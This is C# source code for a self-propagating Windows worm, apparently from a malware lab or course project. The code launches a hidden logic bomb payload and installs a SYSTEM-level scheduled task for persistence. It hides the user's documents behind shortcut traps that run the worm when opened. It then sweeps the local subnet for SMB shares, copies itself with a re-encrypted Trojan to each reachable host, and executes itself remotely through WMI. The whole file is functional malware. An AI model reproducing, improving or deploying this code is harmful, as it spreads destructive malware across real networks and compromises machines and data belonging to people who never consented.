using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
using SharedCrypto;
using IWshRuntimeLibrary;

class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string WORM_EXE_NAME = "Worm.exe";
    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";
    private const string KEY_FILE_NAME = "key.dat";
    private const string SHARED_CRYPTO_DLL = "SharedCrypto.dll";

    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_INTERVAL_MINUTES = 10;

    private const string WORM_TASK_NAME = "Malicious_Worm";
    private const string LOGICBOMB_TASK_NAME = "Malicious_LogicBomb";

    private static string logFilePath;

    static async Task Main(string[] args)
    {
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;

        if (args.Length > 0)
        {
            try { Process.Start(args[0]); } catch { }
        }

        // --- MODIFIED: Change log file extension to .log ---
        string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
        string logFileName = $"Worm_log_{timestamp}.log";
        logFilePath = Path.Combine(baseDir, logFileName);

        LogToFile("========================================");
        LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
        LogToFile($"Running from: {baseDir}");
        LogToFile("========================================");

        try
        {
            LogInfo("Staging disposable payload...");
            StartLogicBombFromDuplicate();

            LogInfo("Attempting to install persistence...");
            InstallPersistence();

            LogInfo("Starting main loop (Infection & Propagation)...");
            await ContinuousScanLoop();
        }
        catch (Exception ex)
        {
            LogError($"Critical error in main loop: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
    }

    private static void StartLogicBombFromDuplicate()
    {
        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string originalPayloadPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);

            if (!Directory.Exists(originalPayloadPath))
            {
                LogWarning($"Original payload folder not found at '{originalPayloadPath}'. Cannot start LogicBomb.");
                return;
            }

            string randomSuffix = new Random().Next(10000000, 99999999).ToString();
            string duplicatePayloadPath = Path.Combine(baseDir, $"{PAYLOAD_FOLDER_NAME}_{randomSuffix}");

            LogInfo($"Creating disposable payload copy at: {Path.GetFileName(duplicatePayloadPath)}");
            CopyFolderSync(originalPayloadPath, duplicatePayloadPath);

            string logicBombPath = Path.Combine(duplicatePayloadPath, LOGICBOMB_EXE_NAME);
            if (System.IO.File.Exists(logicBombPath))
            {
                Process.Start(new ProcessStartInfo(logicBombPath) { UseShellExecute = true, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
                LogSuccess("LogicBomb started successfully from disposable copy.");
            }
            else
            {
                LogWarning($"LogicBomb.exe not found in duplicated payload folder.");
            }
        }
        catch (Exception ex)
        {
            LogError($"Failed to start LogicBomb from duplicate: {ex.Message}");
        }
    }

    private static void InstallPersistence()
    {
        try
        {
            string wormPath = Process.GetCurrentProcess().MainModule.FileName;
            if (CreateScheduledTask(WORM_TASK_NAME, wormPath))
            {
                LogSuccess($"Worm persistence task created: {WORM_TASK_NAME}");
            }
            else
            {
                LogWarning($"Failed to create Worm scheduled task. This is expected if not running as admin.");
            }
        }
        catch (Exception ex)
        {
            LogError($"Persistence installation failed: {ex.Message}");
        }
    }

    private static bool CreateScheduledTask(string taskName, string exePath)
    {
        try
        {
            var deleteTask = new ProcessStartInfo("schtasks.exe", $"/Delete /TN \"{taskName}\" /F")
            { CreateNoWindow = true, UseShellExecute = false };
            Process.Start(deleteTask)?.WaitForExit();

            var createTask = new ProcessStartInfo("schtasks.exe", $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true
            };

            using (var process = Process.Start(createTask))
            {
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                if (process.ExitCode == 0) return true;
                LogToFile($"Failed to create task {taskName}: {error}");
                return false;
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Exception creating task {taskName}: {ex.Message}");
            return false;
        }
    }

    private static async Task ContinuousScanLoop()
    {
        int scanCount = 0;
        while (true)
        {
            scanCount++;
            LogInfo($"========== LOOP #{scanCount} ==========");
            try
            {
                InfectCurrentDirectoryWithLNKs();

                string localIP = GetLocalIPAddress();
                if (string.IsNullOrEmpty(localIP))
                {
                    LogError("Could not detect local IP address. Cannot scan network.");
                }
                else
                {
                    string baseIP = string.Join(".", localIP.Split('.').Take(3));
                    LogInfo($"Local IP: {localIP}, Scanning network: {baseIP}.1 - {baseIP}.254");

                    List<string> smbHosts = await FindSmbServersAsync(baseIP);
                    LogInfo($"Scan complete: Found {smbHosts.Count} SMB host(s) to infect.");

                    foreach (string ip in smbHosts)
                    {
                        await ProcessTargetHost(ip);
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Error during scan loop #{scanCount}: {ex.Message}");
            }

            LogInfo($"Loop #{scanCount} complete. Waiting {SCAN_INTERVAL_MINUTES} minutes...");
            await Task.Delay(TimeSpan.FromMinutes(SCAN_INTERVAL_MINUTES));
        }
    }

    private static void InfectCurrentDirectoryWithLNKs()
    {
        LogInfo("Scanning current directory to create/update LNK traps...");
        try
        {
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            string wormPath = Path.Combine(currentDir, WORM_EXE_NAME);
            string[] targetExtensions = { ".docx", ".xlsx", ".pptx", ".pdf", ".txt" };

            var filesToInfect = Directory.GetFiles(currentDir)
                .Where(f => targetExtensions.Contains(Path.GetExtension(f).ToLower()) &&
                             // --- MODIFIED: Explicitly ignore our own log file ---
                             !Path.GetFileName(f).Equals(Path.GetFileName(logFilePath), StringComparison.OrdinalIgnoreCase));

            int infectedCount = 0;
            foreach (string filePath in filesToInfect)
            {
                string lnkPath = filePath + ".lnk";
                if (System.IO.File.Exists(lnkPath)) continue;

                System.IO.File.SetAttributes(filePath, FileAttributes.Hidden);

                WshShell shell = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnkPath);
                shortcut.TargetPath = wormPath;
                shortcut.Arguments = $"\"{filePath}\"";
                shortcut.IconLocation = filePath + ",0";
                shortcut.Save();
                infectedCount++;
            }
            if (infectedCount > 0)
            {
                LogSuccess($"Created {infectedCount} new LNK traps in the current directory.");
            }
        }
        catch (Exception ex)
        {
            LogError($"Failed during LNK infection process: {ex.Message}");
        }
    }

    private static async Task ProcessTargetHost(string ip)
    {
        LogInfo($"--- Processing target server: {ip} ---");
        if (IsWormAlreadyRunningOnTarget(ip))
        {
            LogInfo($"Worm process already detected on {ip}, skipping");
            return;
        }

        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);

        if (smbConnectResult != 0)
        {
            LogWarning($"SMB connection to {ip} failed - Error: {GetWNetErrorDescription(smbConnectResult)}");
            return;
        }

        LogSuccess($"Connected to share on {ip}");
        string localPackagePath = null;
        try
        {
            localPackagePath = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
            PrepareVictimSpecificPackage(localPackagePath);

            await CopyFolderAsync(localPackagePath, remoteShareUNC);
            LogSuccess($"Copied new worm package to {ip}");

            string remoteWormExePath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
            LogInfo($"Attempting to execute Worm remotely on {ip} via WMI...");
            if (ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath))
            {
                LogSuccess($"Successfully propagated to {ip}");
            }
            else
            {
                LogWarning($"File copy succeeded but WMI execution failed on {ip}");
            }
        }
        catch (Exception ex)
        {
            LogError($"Error processing {ip}: {ex.Message}");
        }
        finally
        {
            DisconnectFromRemoteShare(remoteShareUNC);
            if (localPackagePath != null && Directory.Exists(localPackagePath))
            {
                try { Directory.Delete(localPackagePath, true); } catch { }
            }
        }
    }

    private static void PrepareVictimSpecificPackage(string tempPackagePath)
    {
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        string basePayloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);

        Directory.CreateDirectory(tempPackagePath);
        string tempPayloadDir = Path.Combine(tempPackagePath, PAYLOAD_FOLDER_NAME);
        Directory.CreateDirectory(tempPayloadDir);

        System.IO.File.Copy(Path.Combine(baseDir, WORM_EXE_NAME), Path.Combine(tempPackagePath, WORM_EXE_NAME));
        System.IO.File.Copy(Path.Combine(baseDir, SHARED_CRYPTO_DLL), Path.Combine(tempPackagePath, SHARED_CRYPTO_DLL));

        CopyFolderSync(basePayloadDir, tempPayloadDir);

        string oldKey = System.IO.File.ReadAllText(Path.Combine(basePayloadDir, KEY_FILE_NAME));
        string newKey = CryptoUtils.GenerateRandomKey();

        string originalBombPath = Path.Combine(basePayloadDir, ENCRYPTED_BOMB_NAME);
        string tempTrojanPath = Path.Combine(tempPackagePath, "Trojan.exe");
        string finalBombPath = Path.Combine(tempPayloadDir, ENCRYPTED_BOMB_NAME);

        CryptoUtils.DecryptFile(originalBombPath, tempTrojanPath, oldKey);
        CryptoUtils.EncryptFile(tempTrojanPath, finalBombPath, newKey);

        System.IO.File.WriteAllText(Path.Combine(tempPayloadDir, KEY_FILE_NAME), newKey);

        System.IO.File.Delete(tempTrojanPath);
    }

    private static bool IsWormAlreadyRunningOnTarget(string remoteIp)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = SMB_USERNAME, Password = SMB_PASSWORD, Timeout = TimeSpan.FromSeconds(10) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            var searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM Win32_Process WHERE Name = '{WORM_EXE_NAME}'"));
            return searcher.Get().Count > 0;
        }
        catch { return false; }
    }

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var activeHosts = new List<string>();
        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
        var tasks = Enumerable.Range(1, 254).Select(async i =>
        {
            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync();
            try
            {
                using (var ping = new Ping())
                {
                    if ((await ping.SendPingAsync(ip, PING_TIMEOUT_MS)).Status == IPStatus.Success)
                    {
                        if (ConnectToRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}", SMB_USERNAME, SMB_PASSWORD) == 0)
                        {
                            lock (activeHosts) activeHosts.Add(ip);
                            DisconnectFromRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}");
                        }
                    }
                }
            }
            catch { }
            finally { semaphore.Release(); }
        });
        await Task.WhenAll(tasks);
        return activeHosts;
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up &&
                    (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
                     ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
                {
                    foreach (IPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            return ip.Address.ToString();
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            LogError($"Could not get local IP address: {ex.Message}");
        }
        return null;
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = username, Password = password, Impersonation = ImpersonationLevel.Impersonate, EnablePrivileges = true, Timeout = TimeSpan.FromSeconds(30) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
            {
                var inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = commandToExecute;
                var outParams = processClass.InvokeMethod("Create", inParams, null);
                return outParams != null && (Convert.ToInt32(outParams["returnValue"]) == 0);
            }
        }
        catch { return false; }
    }

    #region Helper Methods
    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
        {
            System.IO.File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
        }
        foreach (string dir in Directory.GetDirectories(source))
        {
            CopyFolderSync(dir, Path.Combine(dest, Path.GetFileName(dir)));
        }
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        var files = Directory.GetFiles(source).Select(async file =>
        {
            try
            {
                await Task.Run(() => System.IO.File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));
            }
            catch (Exception ex) { LogWarning($"Failed to copy {Path.GetFileName(file)}: {ex.Message}"); }
        });
        var dirs = Directory.GetDirectories(source).Select(dir => CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir))));
        await Task.WhenAll(files.Concat(dirs));
    }

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE { dwType = 1, lpRemoteName = remotePath };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        try { WNetCancelConnection2(remotePath, 0, true); } catch { }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope; public int dwType; public int dwDisplayType; public int dwUsage;
        public string lpLocalName; public string lpRemoteName; public string lpComment; public string lpProvider;
    }

    private static void Log(string message, ConsoleColor color)
    {
        string prefix;
        switch (color)
        {
            case ConsoleColor.Green: prefix = "[SUCCESS]"; break;
            case ConsoleColor.Yellow: prefix = "[WARNING]"; break;
            case ConsoleColor.Red: prefix = "[ERROR]"; break;
            default: prefix = "[INFO]"; break;
        }
        string logMessage = $"{prefix} {message}";
        Console.ForegroundColor = color;
        Console.WriteLine(logMessage);
        Console.ResetColor();
        LogToFile(logMessage);
    }
    private static void LogInfo(string message) => Log(message, ConsoleColor.Cyan);
    private static void LogSuccess(string message) => Log(message, ConsoleColor.Green);
    private static void LogWarning(string message) => Log(message, ConsoleColor.Yellow);
    private static void LogError(string message) => Log(message, ConsoleColor.Red);
    private static void LogToFile(string message)
    {
        try { System.IO.File.AppendAllText(logFilePath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}{Environment.NewLine}"); } catch { }
    }

    private static string GetWNetErrorDescription(int errorCode)
    {
        switch (errorCode)
        {
            case 5: return "Access is denied";
            case 53: return "The network path was not found";
            case 86: return "The specified network password is not correct";
            case 1219: return "Multiple connections to a server not allowed";
            case 1326: return "Logon failure: unknown user name or bad password";
            default: return $"Error code {errorCode}";
        }
    }
    #endregion
}